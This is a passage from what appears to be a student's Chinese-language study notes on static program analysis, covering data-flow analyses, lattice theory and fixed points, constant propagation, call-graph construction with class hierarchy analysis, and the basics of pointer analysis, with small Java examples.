p。\n如果这条路径上有x的其他定值，我们就说x的这个定值被kill了\n\n\n\n到达定值可以用来分析未定义的变量。例如，我们在程序入口为各变量引入一个 dummy 定值。当程序出口的某变量定值依然为 dummy，则我们可以认为该变量未被定义。\n\n对于一条赋值语句 D: v &#x3D; x op y，该语句生成了 v 的一个定值 D，并杀死程序中其它对变量 v 定义的定值。\n\n\n\n说人话：\n是在分析在程序中的某点，BBS中定义的一条语句是不是有意义的\n对于第一次遍历(红字)\n\n比如对于B1的出口，定义的D1和D2都是有意义的\n\n比如对于B2的出口，D1就没有意义，因为D4重新定义了y，所以要被Kill，D2、D3是有意义的。\n算法：\n\n该算法是检查程序的其他处有没有定义这个变量，如果定义了就kill掉\n因为路径中没经过的BBS，肯定没有定义过，所以是0，kill不kill无所谓\n\n理解：\n\n按照理解来说，可以检查这条路径上之前有没有定义过，但是这样可能比较麻烦\n\n\n\n理解Reaching Definitions(到达定值)Abstraction(用Di进行抽象)\n程序中所有变量的定值\n能被一个 bit vectors表示\n\n\nTranser function\n\n\n从入口kill掉其他的定值，并加入新生成的定值\nv &#x3D; x op y，gen v, kill 其它所有的 v\n\nControl Flow按照本节最开始讲的一个完整的Data Flow Analysis的结构，需要对transer function的结果进行约束。\n\nAlgorithm of Reaching Definition Analysis\n\n首先让所有BB和入口的OUT为空。因为你不知道 BB 中有哪些定值被生成。\n\n当任意 OUT 发生变化，则分析出的定值可能需要继续往下流动，需要修改各 BB 的 IN 和 OUT。\n\n最终结果就是绿色的，例如b5是0011 1011，也就表示D3 D4 D5 D6 D7会流到B5结束的位置\n\n\n在每个数据流分析中，我们把pp和一个数据流的值相关联，代表可以从这点观察到的所有可能的抽象状态。\n\n通过不停的用transer function和control flow，不停的解和算，直到找到一个solution。\n\n\n\n\n为什么程序会停止？\n\n程序会继续运行，是因为有的bbs变化了，说明有循环，也就是下面这种情况，一i那位如果程序都是顺序执行，就不会有bbs变化，所以一定会停止\n\n\n某一点有可能从0 —&gt; 0，有可能从0 —&gt;1，也有可能从1 —-&gt;1，但是不可能从1—&gt;0，所以程序一定会停止\n\n\n为什么不会从1—&gt;0？\n\n\n假设最终从红色快Di&#x3D;1，流入S，红色框中这一位能是1，说明从S中出来时，这一位就是1，否则不能流到红色框处\n那上次出来是1，说明没有被Kill掉，这次肯定也不会被kill，也可以说，水都流到这了，一定可以流出去\n\nLive Variables Analysis（活跃变量分析）\n沿着p有一条路径，活跃变量分析分析p处的v是不是alive\n换句话说：后面use的v是不是我在p处定义的v，如果是，说明p在v处是alive的，也就是是有效的\n\n说人话：\n活跃变量分析是在分析在该点处定义的变量有没有被使用，是不是废物变量\n\nAbstraction\n用第i个bit表示vi\n\n\n\n程序应该是forward的还是backward？\n这里想探究的问题是变量是否是live？\n因为想知道在某一点是不是alive的，所以你得走到最后，才能知道，因为你不知道中间是否有重定义\n\n所以要从后往前来比较方便\n\nControl flow\nTranser function\n首先程序是Backward，已知out求in\n问题1 ：这里的out为什么是union\n\n因为无论s1 use v 还是s2 use v，Out[B]都等于1\n也就是下面有一条路径是活跃的用了v，在B的in处，都是alive的\n\n问题2：如何求出IN[B]\n我的考虑：\n\n如果B中对v进行了重新定义，IN[B]就为0\n所以out[b]-kill[b]\n我没有考虑完全所有的情况\n\n算法：\n\n首先枚举所有可能的情况\n如果v在B中被重定义了，就应该out[b]-def_b，但是如果在重定义之前，使用了v，in[B]仍然为1，所以将两种情况合并，得到结果\n这里也可以直观的感受为什么程序是backward\n\nAlogrithm of live variables Analysis\n问题1：为什么初始化为空？\n\nmay analysis初始化一般为空，must analysis初始化为all\n\n最终结果：\n\nAvailable Expressions Analysis它是must analysis\n基本概念\nx op y 在 p 点可用的条件：\n\n从流图入口结点到达 p 的每条路径都对 x op y 求了值，\n且在最后一次求值之后再没有对 x 或 y 赋值\n\n说人话：\n\n是在分析表达式(x &#x3D; y+3   表达式是y + 3)有没有意义，是不是白算,看是否所有路径都求了，也就是如果都求了，结果是1，那就可以被替换\n\n也就是如果最后一次算y +3，后面还有对y的重新赋值，那你算的y + 3没有意义\n\n\n\n对于程序的最终结果，蓝色部分来说\n\n表达式p-1就没有意义，因为p在B2处被重定义了\n表达式z&#x2F;5有意义\n表达式2*y没有意义，在B5中y被重定义了\n表达式e7 *x有意义\n表达式y + 3没有意义\n\n他的最终目的是优化表达式：有意义的可以用同一个变量替换，省的重复计算\nAbstraction\n\n0代表在这一点不是Available\n\nTranser function &amp; Control flow\n\n生成新的表达式：x op y\nkill掉引用了变量a的表达式{a + b}\n最后得到{x op y}\n\n\n在黄色这点，该表达式是avaliable的\n\n可以根据定义判断\n每一条路径都计算了 e16 * x\n在表达式的最后(last evaluation)y也就是b语句，没有对x重定义\n\n\n用上面的transerfunction判断\n到x &#x3D; …处时，e16 * x被kill\n到b处，又生成了e16 * x\n两条路径都有e16 * x，所以是avaliable\n\n\n\n\n\n因此，上面的可以被优化成全部用t替换\n到整个程序的最后一条语句时，不用再对t进行计算，因为Last evaluation已经计算过了\n\n\n问题1：为什么是交？\n\n因为需要所有的path都计算last evaluation，需要取一个最终的结果\n\n假设有一条path如果是1的话，另一条path是0，那这个表达式是否是avaliable呢？\n\n因为要safe，所以它有可能是不可达的，所以那就要认为是不可达的\n\n\n\n\n看这个小绿箭头和绿方框， z &#x2F; 5这个表达式有可能是不avalable的，所以要取交，认为他是0\n\n问题2：如何理解under approximation？\n\n也就是它可能会有漏报\n\n\n对于这种情况，按照上面的transer function，到c表达式的In的地方，显然{e16 * x}不是avaliable\n\n所以在c处要重新计算\n\n\n但是有可能上面的x和重定义的x都等于3\n\n这种情况下，也就是可以把c处进行优化，就是不用再重新计算了\n\n但是按照transer function，我并没有产生误报，只是没有优化，并不影响程序的执行\nAlogrithm of Available Expressions Analysis\n问题1：为什么OUT[B]的初始化是all(都是1)\n按照现在的理解\n\n\n根据这个图，如果初始化是0的话，也就是此时红色框处的输入就变成了00000，那我上一步做的就没有意义了，p-1此时一定是avaliable的\n因为是交，所以为了保留原来的结果，一定得是11111\n\nmusy analysis 初始化一般都是all\n\nAnalysis Comparison\n\n\n\nReaching Definitons\nLive Variables\nAvaliable Expressions\n\n\n\nDomain\ndefinitions的集合\nvariables的集合\nexpressions的集合\n\n\nDirection\nforward（会不会path）\nbackward(后面有没有use)\nforward（所有的Path有没有evaluation）\n\n\nMay&#x2F;Must\nMay analysis\nMay analysis\nMust Analysis\n\n\nBoundary（边界）\nout[entry]&#x3D;null\nin[exit]&#x3D;null\nout[entry]&#x3D;null\n\n\nInitialization\nout&#x3D;null\nin&#x3D;null\nout&#x3D;all\n\n\nTranser function\nout &#x3D; gen U (in - kill)\n\n\n\n\nMeet\n并\n并\n交\n\n\n\n\n\n\n\n\n根据含义去确定Boundary(边界)\n\ninialization：对于到达性分析，entry都没有定义Di，所以out[entry]一定是null\n\n说人话：\nReaching Definitions：\n\n分析在BBS中写的语句，例如 x &#x3D; y + 3，对于程序中的某点，有没有意义\n初始化时所有的Out都是0，是May analysis，因为有一条路径定义了一个Di，那么对于下一个bbs的输入，他是有意义的\n\nLive Variables Analysis：\n\n分析在某点如果定义了这个变量，对程序中的某点，有没有意义。\n初始化所有的in是0，是may analysis\n\nAvailable Expressions：\n\n分析定义的表达式：x &#x3D; y +3中的y + 3，对于程序中的某点，有没有意义\n\n另一方面的理解\n\n对于may analysis，是并，也就是有一条路径满足就行，那对于加法操作，初始化一定是0\n对于must analysis，是交，必须所有路径都满足，那对于乘法操作，初始化一定是1\n\n\n总结Q1：理解三个数据流分析\n\n首先数据流分析只分析一个函数内部的，不涉及到方法调用，也不涉及到两个变量指向同一个空间\n关于到达定制分析，活跃变量分析，可用表达式分析，看上面那个图的总结\n\nQ3：理解迭代算法，以及为什么他能终止\n\n迭代算法由transer function和约束条件组成，程序的结果会从0–&gt;1   1–&gt;1  0—&gt;0，不会从1–&gt;0，所以当所有的块不再改变时，程序就终止了\n\nData Flow Analysis Foundationsiterative algorithms（迭代算法）\n对于数据流分析，迭代算法生成了一个solution，也就是01组成的串\n\nview itrative algorithm in another way\n对于一个有k个nodes的CFG，迭代算法在每次迭代时，更新每个节点的Out\n\n假设数据流分析的值域是V，那么可以定义一个K个元素的元组(k-tuple)\n$$(Out[n_1],Out[n_2],…Out[n_k]$$\t\n也就是一个集合$$(V_1*V_2…V_n)$$,定义这个集合为$$V^k$$在每次迭代后，保存新的值\n\n每次迭代都是通过应用transer function 和control flow, 把一个map $$V^k$$变成一个新的map$$V^k$$，整个过程可以抽象为：\n$$F : V^k -&gt;V^k$$\n\n该算法输出一系列的k-tuples，直到每个node的output不再变化\n\n\n图示形式：\n\n对于这个算法，绿色部分就对应上面的F 函数\n\n\n\n也就是初始化时init 都为空，接着进行迭代\n令第一次的结果为$X_0$，$$X_1 &#x3D; F(X_0)$$\n最终不变时，达到的结果是$$X_i &#x3D; F(X_i)$$\n此时程序输入的是$X_i$，输出的也是$X_i$，也就是这个iterative algorithm达到了一个不动点(fixed point)\n\n问题来了这个iterative alogrithm 是对于data flow analysis生成一个solution\n\n\n这个程序一定会达到不动点么？\n如果达到了，只有一个不动点么？如果超过一个，如何确定我们得出的solution就是最好的呢\n我们的算法要经过多少步达到不动点\n\npartial order（偏序）\n\n定义了一个偏序集(poset)，用pair表示，，P是一个集合，后面的符号(统称为&lt;&#x3D;)是偏序关系，如果集合中的元素满足上面的三条性质(自反性、反对称性、传递性)，就构成P上的偏序集合\n\n例1：S是一个整数集，符号是小于等于\n\n\n满足三条性质，构成偏序集\n\n例2：S是一个整数集，符号是小于\n\n显然不构成 1 &lt; 1 2 &lt; 2是错的\n\n例3：S是一系列(下图)英文单词的集合，符号表示substring，s1&lt;&#x3D;s2，表示s1是s2的子串\n\n例4：S是{a,b,c}的幂集，符号表示子集\n\n理解偏序(partial)的含义\n\n意味着不是集合中的每对元素都要满足给定的关系(符号 &lt;&#x3D;)\n比如上面的 pin 和 sin就不满足\n\nUpper and Lower Bounds(上下界)\n这玩意不就是高中数学\n\nu是S的upper bound，也就是S中的所有元素都$\\subseteq$u\n\nl是S的lower bound，也就是l$\\subseteq$S中的所有元素\n\n\n\n\n对于这个集合来说，显然upper是{a,b,c}，lower是{}\n\n                                            \n\n最小上界(lub  or  join)：l_lS\n最大下界：(glb or meet)\n\n\n如果只包含两个元素\n\nlub：a l_l  b  也就是 a join b，就是a并b\nglb： 也就是a meet b，就是 a 交 b\n\nSome  Properties\n不是每个偏序集都有glb 或者 lub\n\n\n\n如果一个Poset有lub 和 glb，那一定都是唯一的\n\n\nLattice\n\n偏序集中的每两个元素，都有它的最大下界和最小上界，这个偏序集被称为一个lattice\n\n上面的例3，显然不构成lattice，pin和sin在集合中找不到最小上界\n\nComplete Lattice\n\n给定一个lattice P和它的任意一个子集S，如果joinS和meet S(S中可能不只两个元素a b)存在，那么P是一个complete lattice\n\n说人话：一个lattice的所有子集都lub和glb\n\nlattice是任意两个元素都有glb和lub，complete lattice是任意一个子集\n\n\t\n\n\n正整数集是无穷的，没有边界，所以不是complete lattice\n\n\n\n对于这个幂集，它是complete lattice，假设子集是{a,b}，虽然glb和lub不在subset中，但是在lattice中\n\nBounds可以不在subset中，但是要在lattice\n\n\n每一个complete lattice，都有一个top和bottom\n\n\n\n每个有穷的lattice都是complete lattice\n\nProduct Lattice\n\n给定一系列lattice，如果对于每一个偏序集，都有最小上界和最大下届，这些所有的偏序集就构成一个product lattice$$L^n &#x3D; (P,\\subseteq)$$\n\n这个product lattice被定义为：\n\n\n一个product lattice是一个lattice\n如果构成product lattice的每一个lattice都是complete lattice，那么这个product lattice也是complete lattice\n\nData Flow Analysis Framework via Lattice\n\nD：forward还是backward\nL：包括domain和operator\nF：一系列的从V 到V的transfer functions\n\n\n\n可以看到，右边的图(may analysis)是从bottom往上走的\n\ndata flow analysis可以看成对lattice的值迭代的使用transfer functions和meet&#x2F;join operations\nMonotonicity（单调性）\n\nL是一个lattice，if 任意的x y属于L, $$x \\subseteq y$$，f(x)$\\subseteq$f(y)\n\nFixed-Point Theorem(不动点定理)\nL是单调的，且L是有穷的，那么最小不动点和最大不动点能通过迭代求出来\n\n求最小不动点：第一次用bottom作为输入，得到f(bottom)，再把f(bottom)作为下一次的输入，直到求出一个不动点，这个不动点就是最小不动点\n\n求最大不动点：第一次用top作为输入，得到f(top)，再把f(top)作为下一次的输入，直到求出一个不动点，这个不动点就是最大不动点\n\n\n证明不动点Existence of Fixed Point\n\n首先定义一个bottom，f(bottom）就是对bottom进行transer funtion变换，可以理解为右下的图，从{}走到了{a}\n\n\n\n因为f是单调的，所以 f(bottom)$\\sqsubseteq$f(f((bottom))，一直到$f^i(bottom)$\n那由于L是有穷的(程序最终的111…111)，假设最终值是$f^H(bottom)$，此时再对他进行transer function，就不会变了(因为1不会变成0？)\n从下面gitbook的证明看出来，和我想的一样，但是这个ppt上的证明我属实没看懂\n\ngitbook的证明：\n根据$\\bot$和f的定义，我们可以得到：$\\bot \\sqsubseteq f(\\bot)$。\n由于 L 是有限的，且 f 单调，根据鸽笼原理，必然存在一个 k 使得$\\bot \\sqsubseteq f(\\bot) \\sqsubseteq f^2(\\bot)\\sqsubseteq …\\sqsubseteq f^k(\\bot)\\sqsubseteq f^{k+1}(\\bot) $，且$f^k(\\bot) &#x3D; f^{k+1}(\\bot)$。\nLeast Fixed Pointgitbook的证明：(通俗易懂，ppt上写的我没看懂)\n假设我们有另一个任意不动点 x，由于 f 是单调的，因此$f(\\bot) \\sqsubseteq f(x), f^2(\\bot) \\sqsubseteq f^2(x),…,f^{Fix} &#x3D; f^k(\\bot)\\sqsubseteq f^k(x) &#x3D; x$\n可知的确$f^{Fix}$是最小不动点。\n通过上面的证明，我们又回答了一个问题：如果我们的迭代算法符合不动点定理的要求，那么迭代得到的不动点，确实就是最优不动点。\nData Flow Analysis Foundations IIRelate Iterative Algorithm to Fix-ed Point Theorem\n问题1：这两个怎么联系起来呢？\n\n第一步：确定product lattice，且是finite\n\n这里的每一个节点都对应一个Lattice。假设他是reaching definitions，假设有3个变量D1 D2 D3\n\n他的domain一定是(0,0,0)  … …. (D1,D2,D3)\n\n所以它是lattice\n\n每一个lattice都是finite，所以整体也是finite\n\n\n第二步：确定 f: L -&gt; L 是单调的\n对于iterative algotithm来说，f相当于control flow和transer function\n\n因为 transer function**(OUT &#x3D; gen U (IN - kill))**的结果一定是从0 到1，不会从1到0 ，所以是单调的\n\n现在需要证明：control flow也是单调的，也就是 join&#x2F;meet后的结果是也是单调的  LxL -&gt; L\n\n即需要证明 任意的x , y, z 属于L，x$\\sqsubseteq $y，需要证明 $x \\sqcup z \\sqsubseteq  y \\sqcup  z $\n\n单调的定义是：x&lt; y, f(x) &lt; f(y)，这里的meet就相当于f\n\n根据定义， $y\\sqsubseteq y\\sqcup  z$，因为y meet z是least upper bound \n所以 $x\\sqsubseteq y\\sqcup  z$，这里证明$y\\sqcup  z$是x的上界\n又因为 $x\\sqsubseteq x\\sqcup  z$，且 $x \\sqcup z$是x的least upper bound\n所以 $x \\sqcup z\\sqsubseteq y\\sqcup  z$\n\n到这里可以把不动点定理应用到iterative algorithm中\n这个证明我现在不是很懂，那是不是说明 x meet y也小于等于 y meet z呢\nReview the questions\n\n这个程序一定会达到不动点么？会，根据不动点定理\n\n如果达到了，只有一个不动点么？如果超过一个，如何确定我们得出的solution就是最好的呢？greatest or least fixed point\n\n我们的算法要经过多少步达到不动点? \n最坏情况是：h*k\n\n\nWhen will the algorithm reach the fixed point？\nlattice的高度：lattice中从bottom到top最长的path\n\n\n\n假设 lattice 的高度为 h，而我们的 CFG 节点数为 k，就算每次迭代可以使一个节点在 lattice 上升一个高度，那么最坏情况下，我们的迭代次数也就是 $i &#x3D; h \\times k$\n这也回答了上面最后一个问题\n\nMay and Must Analysis , a Lattice View\n都是从unsafe 向safe 走，\n\nMay  Analysis View将lattice抽象成一个视图\n例如，对于到达定值分析，下界代表没有任何可到达的定值，上界代表所有定值都可到达。\n目标：我们的目标是在程序运行后，找到一个可以替换的变量(优化)，也就是看最终哪个是0，如果是0的就可以被替换。\n那么在初始化的时候，用反证法要要求所有的都是0，然后找出不是0的。\n目标是找到可以替换的变量。\n\n下界代表 unsafe 的情形，即我们认为无到达定值，可对相关变量的存储空间进行替换，所有都能替换。**—-&gt;对应sound**\n上界代表 safe but useless 的情绪，即认为定值必然到达，但是这对我们寻找一个可替换掉的存储空间毫无意义，也就是所有的都不能替换。\n\n而因为我们采用了 join 函数，那么我们必然会从 lattice 的最小下界往上走。而越往上走，我们就会失去更多的精确值。那么，在所有不动点中我们寻找最小不动点，那么就能得到精确值最大的结果。\n\nMust Analysis View目标：找到最终表达式结果是1的，是1的就不用重复计算了，可以替换\n那初始化的时候，用反证法，就假设都是1，意思就是所有的表达式都没有其中的值被重新定义，也就是所有的表达式都可以用原来的值替换，这肯定是Unsafe的。\n反之，所有的表达式都不avaliable,需要重新计算所有的值，肯定是safe，都别优化了\n\n\n下界代表 safe but useless 的情形，因为需要重新计算每个表达式，即确实有表达式可用。而上界代表 unsafe，因为不是所有路径都能使表达式都可用。与 may analysis 一样，通过寻找最大不动点，我们能得到合法的结果中精确值最大的结果\n\nanother view of leaest fixed point\n以may analysis举例\n\ntranser function中 kill 和gen是固定的\ncontrol flow merge 是  union，对于lattice来说union是最小上界\n所以每次都走的是最小的一步，那最后得到的肯定是最小不动点\n\nHow Precise is our SolutionMeet-Over-All-Paths Solution(MOP)\n这里的meet包括(meet&#x2F;join)\n\n\n\n对所有的out应用transer function，再用meet操作符\nMOP在每条路径的结尾计算所有的data-flow的值，应用应用Meet去找到 lub &#x2F; glb\n\n但是基于上面的表达式可能有些问题\n问题1：有些路径是不可执行的（not executable）\n\n上面是考虑了所有的路径，但是有写路径可能永远不会被执行\n\nx=10;\nif(x>10)&#123;&#125;\n\n问题2：not unbounded(没有边界)\n\n如果有一条path中有循环，循环中定义s1,s2两个变量,也就是这条path上会包含非常多个s1,s2\n\nfor()&#123;\ns1;\ns2;\n&#125;\n\n问题3：Not enumerable\n\n可能程序很大，不可枚举\n\nOurs(iterative Algorithm) vs MOP\n\n我们的算法是在每一个merge的时候，join\n\nMOP是在最后merge\n\n\n把黄色的部分用x代替，红色的部分用y代替\n证明一下他俩的关系：\n\n\n这个很好理解，F($x\\sqcup y$)是F(x)和F(y)的upper bound,F(x)和F(y)的最小上界是$F(x)\\sqcup F(y)$\n所以$MOP \\sqsubseteq Ours$\n\n当F具有可分配性时\n\nbit-vector或者Gen&#x2F;kill的transer function(用join &#x2F; meet)都是distributive\n\n所以我们之前的都和MOP一样准确\n\n关于must analysis 还是 may analysis的分析Reaching definitons\n它的目标是：判断在此处定义的D1 … Di是否有意义，如果每意义，就被优化，1代表有意义，0代表无意义。\n也就是如果有一条路径是1，代表可能有意义，就不能被优化\n所以要 把结果并起来，所以是may analysis\n\nlive avaliables\n它的目标是判断变量后面是否被用了，如果是无意义的变量，就把它的空间释放掉，用来存储新的寄存器值\n1代表有意义，0代表无意义\n也就是如果有1条路有意义，就不应该被优化\n所以同上\n\navaliable expressions\n它的定义说要考虑所有的路径，是否在每一条路径都执行了x op y，如果都执行了，就可以把这个结果用一个新的变量替换\n那如果有一条路劲没计算，显然就不能别替换，输出是0\n所以要把所有的结果取 交集\n\nConstant Propagation程序的p点有一个变量x,判断在P点是否可以guaranteed x是一个常量\n\n要考虑所有的路径上是否定义的值都一样，如果有两条路径是x&#x3D;2，有一条是x&#x3D;3，那显然不行\n所以是must analysis\n\n从top往bottom走，最下面肯定是最安全的，因为你要考虑的问题(优化的目标)是 是否是constant，最下面是所有的都不是constant，所以肯定是safe\n\n考虑所有的meet\nnac：Not a constant\nV：value\n\nnac 和 v肯定是nac\n\nundef 和 v是 v\n但是这里有一种情况是，假设程序走了Undefined的路径，表示没有这个常量，但是输出结果是有一个常量，那在程序获取undefined三，少了一个值。\n解释：在constant propagation（常量传播）中，只考虑常量传播，不focus于未定义这种情况\n\n\nTransfer function\n _表示通配符，无论是啥值，都干掉\t\n\nx如果是常量，生成的就是x和对应的值\n如果x&#x3D;y，y是一个变量，那就去取y的值，如果是常量就是，不是就不是\nx&#x3D; y op z，就进行计算\n两个都是常量\n有一个不是常量\n其中有一个是undefi，或者两个都是undef\n\n\n\n这里提了一句，如果把undef给了一个值，那transfer function就不单调了。\n我的理解：\n回看定义\n现在需要证明：control flow也是单调的，也就是 join&#x2F;meet后的结果是也是单调的  LxL -&gt; L\n即需要证明 任意的x , y, z 属于L，x$\\sqsubseteq $y，需要证明 $x \\sqcup z \\sqsubseteq  y \\sqcup  z $\n\n假设z是undef，那 $x \\sqcup z \\sqsubseteq  y \\sqcup  z $ 这个表达式不一定成立\n\n为什么是Nondistributivity\n\niterative algorithm的结果是nac\nmop的结果是10\n他俩不相等，所以他就不是distributivity\n实际结果是10，mop准\n\nWorklist Algorithman optimization of iterative algorithm，是iterative algorithm的优化\n\n实际上用的是Worklist Algorithm\n\n回顾iterative algorithm\n\n\n有一个变化了，所有的都要重新算，很冗余\n\n\n\n总结Q1：理解迭代算法的功能\n\n包括初始化，bounary，must analysis和may analysis的初始化不一样\nin、out\n\nQ2：lattice和complete lattice\n\nlattice表示偏序集中的每两个元素都有最小上界和最大下界\ncomplete lattice表示偏序集的每个子集都有最小上界和最大下界\n\nQ3：理解不动点定理\n\n如果一个lattice是单调的，且有穷的，那可以通过迭代算法得到最小不动点\n\nQ4：在lattice中总结may analysis和must analysis\n\n关于Must analysis和may analysis，很重要的一点是要理解程序的目标是什么\n如果他的目标是找1，结果是1的被替换，那就是must analysis\n如果目标是找0，0的被替换，那就是May analysis\n\nQ5：MOP和迭代算法的关系\n\nMOP算法走所有的路径，在程序的最后merge\n而迭代算法在有merge的情况下就会merge\n\nQ6：关于常量传播\n\n他是Must analysis\n\nQ7：Worklist 算法\n\n对迭代算法进行优化，只计算变化的块，后面的指针分析都是worklist算法\n\nInterprocedural AnalysisMotivation（为什么需要过程间分析呢）问题1：之前学到都是过程内分析，但是肯定会有方法调用，那该怎么办呢？\n\n之前都是会做最保守的假设，也就是最安全的假设\n对于常量分析而言，就假设不是常量\n\n下面的 x y n对于过程内分析(inter procedural)而言，都是nac\n\n为了更好的精度，就需要过程间分析：也就是需要沿着过程间分析的control - flow edges传递数据流信息。\n对于下面的图，最关键的就是call graph\n\nCall Graph ConstructionCall Graph\ncall graph就是一系列call edges的集合，从调用点到他们的目标方法\n\n\nCall Graph Construction for OOPLS（focus on java）\nMethod Calls(Invocation) in Java\nSpecial call处理三种方法： 私有方法、构造函数、父类方法\n\nstatic call和special call都是在编译时，就可以确定了，但是像其他的实例方法，需要在运行时候才能确定\nInstruction：指Java的IR中的指令\nReceiver objects：方法调用对应的实例对象（static方法调用不需要对应实例）。\nTarget methods：表达IR指令到被调用目标方法的映射关系\nNum of target methods：call对应的可能被调用的目标方法的数量。Virtual call与动态绑定和多态实现有关，可以对应多个对象下的重写方法。所以Virtual call的可能对象可能超过1个。\nDeterminacy：指什么时候能够确定这个call的对应方法。Virtual call与多态有关，只能在运行时决定调用哪一个具体方法的实现。其他两种call都和多态机制不相关，编译时刻就可以确定。\n\n 意思也就是：在编译时刻，不能确定传给哪个对象，不能确定是调用父类的方法还是子类的方法。\nMethod Dispatch of Virtual Calls在run-time时，一个virtual call取决于以下两点：\n\nreceived object的类型(也就是o的类型，应该是Class)\n调用点的method signature\n\n\n一个signature是一个方法的identifier\n\n\nclass type：这里是C\nmethod name：foo\ndescriptor：返回类型+参数类型\n\n这里用C.foo(P,Q,R)简写\n接着定义了一个Dispatch(c,m)模拟运行时的方法调用过程\n\n这里的目标是找到m方法并调用\n\n如果c包含一个和m有同样名字和descriprot的非抽象方法 m’(因为只有非抽象的方法才能被调用)\n否则就去c的父类中找\n\nAn Example\n\n\n这里的B表示的是received object的类型\n\n\nClass Hierarchy Analysis(CHA)这个算法的目标是在编译时，根据receiver variable来判断它可能调用哪个类的方法\n\n它需要类的迭代信息\n需要receiver variable的 declared type\n\n\nCall Resolution of CHA这里定义了一个函数Resolve(cs)，通过调用点来判断可能的目标方法\n\n这里分成三类，分别是静态方法，special call(构造器、super、私有方法)，和virtual call\nstatic call\n\n就直接调用就行了\n\nspecial call这里以super方法为例\n\n\n首先获得它的类，\n然后用Dispatch，根据前面学的，Dispatch就是先在当前类找同名方法，如果没有，就找它的父类\n\nvirtual call\n获得receive variable的类型\n然后对它和它的所有子类应用dispatch\n\nAn example\nc.foo()  肯定就是C.foo()\na.foo()    返回结果是 {A.foo()，C.foo()，D.foo()}\nb.foo() 返回结果：{A.foo()，C.foo()，D.foo()}\n\n先对B应用Dispatch，他没有这个方法，就要去它的父类中找，所以是A.foo()\n\n这里我用java测试一下，如果B类中没有这个方法，那是会去找他的父类，这条性质我忘记了 ，就严格按照Dispatch的定义来就行\npublic class B extends A&#123;\n\n    public B() &#123;\n    &#125;\n    public static void main(String[] args) &#123;\n        B b = new B();\n        b.foo();\n    &#125;\n&#125;\npublic class A &#123;\n    public void foo()&#123;\n        System.out.println(\"A的foo调用\");\n    &#125;\n&#125;\n\n\n\n\nFeatures of CHA优点：\n\n快，只考虑receiver variable\n忽略数据流信息\n\nide中用的就是CHA \n\nCall Graph Construction -&gt; Algorithm\nAn Example\nInterprocedural Control-Flow GraphCFG表示一个方法的结构\nICFG就是表示整个程序的结构\nICFG包括所有方法的CFG，再加上两种额外的边\n\nCall edges\nReturn edges：\nreturn sites：紧跟着call site的下一条语句是return site\n\n\n\n\n从call graph中获取这两种边\n\nAn example\n\n这里的小黄是 call-to-return edges，就是从Call site到return site\n它用来传递Local data-flow，比如 a&#x3D;6\n\nInterprocedural Data-Flow Analysis\n\n现在多了两种边，需要多两种transfer\n\nInterprocedural Contant Propagation\n\n\n这里要保留edge transfer的返回结果，比如返回的是b，原来流到这的也是b，所以要kill 原来的b\n\n\n如果是过程内分析(IntraProcedural)，那就会保证一种safe的情况，正如本节课最开始的时候说的，就会对于有call method这种，假设不是常量。\n\n\n这里就会假设addOne的返回值不是常量，所以一直到最后b c都不是常量\n因此就会unprecise\n\n\n\n总结\n前面学的都是一个方法内部的分析，也就是过程内分析，只有CFG\n现在再加两种边，call edege和return edge，他们俩从CG(call graph)中获取，构成了这个的ICFG\nPointer AnalysisProblem of CHA\n\n对于CHA来说，n.get只看Number的类型，所以会返回三个call targets，有2个是false postives，这样对于常量分析来说，返回了 0，1，2，所以是NAC\n\n因此就有了指针分析，可以更准确的找到调用的方法.\n\n会根据n指向的对象来构造调用图，所以只会调用One的get方法(1 call target)，基于这个做常量传播，就是准确的。\n\nPointer Analysis分析的是内存中指向哪个地址\n对于oo语言来说\n\n回答的是一个对象指向哪些对象\n\n是may analysis\n\n对于一个指针指向哪些对象，是一个over-approximation，我们问的问题是一个指针可能指向哪个对象\n\nExample\n问题1： 为什么y指向new B\n\n因为返回的this.b之前被赋值了，变成了指向new B，所以y也指向new B\n\nPointer Analysis and alias Analysis（别名分析）指针分析\n\n一个指针指向哪个对象\n\n别名分析\n\n两个指针指向同一个对象么\n\n\n别名分析的信息可以通过指针分析推导出来\nApplication of Pointer Analysis\nCompiler optimization\nBug detection\nSecurity Analysisi\nCall graph,aliases\n\nKey Factors in Pointer Analysis\nHeap abstraction问题：指针分析时，如何对堆的内存进行建模？\n\n程序动态执行时，如果程序中有循环，就会产生无穷多个对象，这样指针分析就无法终止了？\n\n那如何终止？\n\n用堆抽象，把无穷的对象 抽象成 有限的抽象的对象\n\n\nAllocation-Site Abstraction\n给具体的对象建模时，抽象成他们的创建点\n用这个抽象点去代表具体的对象\n\n\n\n把三次循环的结果，抽象成一个创建点o2\n静态分析就只处理o2，也就是程序中有几个new，静态分析就处理几个对象\n\nContext Sensitivity(上下文敏感 )问题：如何堆调用上下文进行建模?\nContext-sensitive：\n\n会区分不同方法的上下文\n如果一个方法有多个上下文，就都分析\n\n\n\n这种就分析2次\n\n上下文敏感对提升指针分析非常有用。\nContext-insentitive\n\n\n只分析1次\n但是merge data flow，可能会丢失精度\n\nFlow sensitivity问题：如何对指针分析中的control flow建模？下面两种方法\n\n\n该图中，左边是flow-sensitive，右边是flow-insensitive\n\nflow-sensitive：\n\n在每个程序的Location，都维持一个指向关系的map\n下面为什么s指向的值是x 而不是y，我还重新学了一下java的String知识。\n总结来说开始时c.f指向的是常量池中的x，s也指向的是x\n但是c.f现在指向了y，就是常量池中新建了一个y，但是此时s还指向的是刚才的，所以是x\n\n\n\nflow-insensitive\n\n忽略程序流的控制流信息，维持程序中的所有指向\n所以o1.f的所有可能值就是{x,y}\ns指向c.f，所有s的所有可能值也是{x,y}\n\n总结;\n目前java中都使用flow-insensitive\nAnalysis Scope问题：指针分析时应该分析程序中的哪一部分呢？有下面两种方式\n\n\n对于whole-program，左边的蓝色图，分析x&#x3D;o1，，y&#x3D;o1,z&#x3D;o4\n对于Demand-driven，右边的黄图，只需要分析z&#x3D;04就够了\n\nwhole-program\n\n计算程序中所有pointer的指向信息\n\nDemand-driven(需求驱动)\n\n根据specific sites of interest进行分析\n\n总结\n\n选择全程序分析\n\nPointer Analysis in this course\n目前没有研究说 Context-sensitive比Context-insensitive不好\n先学Flow-insensitive，再学Flow-sensitive\nWhole-program可以分析完所有的程序，适用于各种需求\nConcerned Statements指针分析只关注影响指针指向的语句\nPointers in Java会local variable，就会Static field\n会Instance field 就会Array element\n\n\n本地变量\n\nStatic field：C.f  \t\n\nInstance field：x.f   x指向的对象有一个field f\n\nArray element：忽略索引，用一个single field，也就是arr，来指向存储在array中的任何值\n\n\n\nPointer-Affecting Statements只需要关注下面这5种语句，对于很长的语句，简化成3AC\n\nfocus  virtual call\n\n总结\nPointer Analysis\nCHA的问题：对于CHA，找到的call 